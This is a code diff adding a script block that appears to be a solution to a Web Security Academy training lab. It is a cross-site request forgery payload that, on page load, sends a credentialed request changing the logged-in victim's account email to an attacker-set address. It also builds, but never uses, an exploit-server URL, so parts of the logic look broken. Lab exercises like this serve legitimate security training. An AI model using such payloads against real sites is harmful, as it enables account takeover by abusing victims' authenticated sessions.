@@ -1,0 +1,17 @@
+<script>
+	var vulDomain = "ac5c1f931f07e063c12b2725008000ab";
+	function sendPost(){
+		var xhr = new XMLHttpRequest();xhr.open("POST", "https://" + vulDomain + ".web-security-academy.net/my-account/change-email", true);
+		xhr.withCredentials = true;
+		xhr.send("email=myemail@gmail.com");
+		xhr.onreadystatechange = function () {
+			upload_url = "https://exploit-acd61f3e1fe0e0d7c17327b0013b00ee.web-security-academy.net/?upload=" + "email=myemail@gmail.com";  
+			var exploitXHR = new XMLHttpRequest();
+			exploitXHR.open("GET", "https://" + vulDomain + ".web-security-academy.net/my-account/change-email", true);
+			exploitXHR.withCredentials = true;
+			exploitXHR.send();
+		}
+	}
+	sendPost();
+</script>
+
